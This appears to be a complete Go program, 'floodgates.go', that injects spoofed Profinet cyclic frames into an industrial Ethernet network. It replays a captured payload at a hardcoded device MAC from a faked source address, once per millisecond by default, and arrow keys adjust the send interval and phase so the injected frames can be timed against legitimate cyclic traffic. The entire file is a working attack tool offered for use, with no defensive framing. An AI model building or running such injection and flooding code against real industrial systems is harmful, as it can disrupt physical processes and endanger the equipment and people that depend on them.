//floodgates.go
/**

Usage: go build .; sudo ./floodgates {interface name}

arrow keys control offset and interval of packet sends, default sends one packet every millisecond

panic exit/e-stop is Ctrl+C (may take several presses to force kill child threads!)
*/
package main

import (
	"encoding/hex"
	"fmt"
	"log"
	"net"
	"os"
	"time"

	"github.com/eiannone/keyboard" //library for keyboard input
	"github.com/mdlayher/ethernet" //library to handle layer 2 traffic

	"github.com/mdlayher/raw"      //helper library for raw sockets
)

// PROGRAM ENTRYPOINT
func main() {
	sendTraffic("90018080808080808075300000000000008000000000000000008020000000800000000000000000000000013500", os.Args[1]) // flood traffic captured from the network
}

// golang Iota enum to allow control with arrow keys
const (
	freqUp = iota
	freqDown
	offsetUp
	offsetDown
)

//main buisness function. Handles payload marshalling, starts user interface, and contains the main loop.
func sendTraffic(payloadHex string, ifaceName string) {
	iface, err := net.InterfaceByName(ifaceName)
	if err != nil {
		log.Fatalf("failed to open interface: %v", err)
		os.Exit(1)
	}
	rawSocket, err := raw.ListenPacket(iface, uint16(0x8892), nil)
	if err != nil {
		log.Fatalf("failed to start listener : %v", err)
		os.Exit(1)
	}
	payloadBytes, err := hex.DecodeString(payloadHex)
	if err != nil {
		log.Fatalf("failed to marshal payload from hex : %v", err)
		os.Exit(1)
	}
	f := ethernet.Frame{
		Destination: net.HardwareAddr{0xa8, 0x74, 0x1d, 0x03, 0x33, 0xcd}, // hardcoded hardware address
		//Source:      net.HardwareAddr{0xa8, 0x74, 0x1d, 0x03, 0xd5, 0xdd},
		Source:    net.HardwareAddr{0xde, 0xad, 0xbe, 0xef, 0xca, 0xfe},   // source address, may be spoofed
		EtherType: 0x8892,                                                 // profinet cyclic ethertype
		Payload:   payloadBytes,
	}

	payload, err := f.MarshalBinary()
	if err != nil {
		log.Fatalf("failed to marshal packet : %v", err)
		os.Exit(1)
	}
	addr := &raw.Addr{HardwareAddr: net.HardwareAddr{0xa8, 0x74, 0x1d, 0x03, 0x33, 0xcd}}
	events := make(chan int, 100) //create a channel to handle keyboard input events
	wavelength := 1000
	go keyboardProcess(events) //start the keyboard handler
	
	/**
		MAIN PROGRAM LOOP
	*/
	
	for {
		select {
		case x, ok := <-events:
			if ok {
				if x == freqUp {
					wavelength++
					log.Printf("Wavelength set: %d\n", wavelength)
				} else if x == freqDown {
					wavelength--
					log.Printf("Wavelength set: %d\n", wavelength)
				} else if x == offsetUp {
					time.Sleep(time.Duration(wavelength/6) * time.Microsecond)
					log.Printf("Moving +1/6 wavelength")
				} else if x == offsetDown {
					time.Sleep(time.Duration(5*wavelength/6) * time.Microsecond)
					log.Printf("Moving -1/6 wavelength")
				}
			} else {
				fmt.Println("Channel closed!")
			}
		default:
			_, err = rawSocket.WriteTo(payload, addr)
			if err != nil {
				log.Printf("failed to send frame : %v", err)
				os.Exit(1)
			}
		}

		time.Sleep(time.Duration(wavelength) * time.Microsecond)
	}

}

func keyboardProcess(events chan int) {
	keysEvents, err := keyboard.GetKeys(10)
	if err != nil {
		panic(err)
	}
	defer func() {
		_ = keyboard.Close()
	}()

	fmt.Println("Press ESC to quit")
	for {
		event := <-keysEvents
		if event.Err != nil {
			panic(event.Err)
		}
		if event.Key == 0xFFED {
			events <- freqUp
		} else if event.Key == 0xFFEC {
			events <- freqDown
		} else if event.Key == 0xFFEA {
			events <- offsetUp
		} else if event.Key == 0xFFEB {
			events <- offsetDown
		}
		if event.Key == keyboard.KeyCtrlC {
			break
		}
	}
}
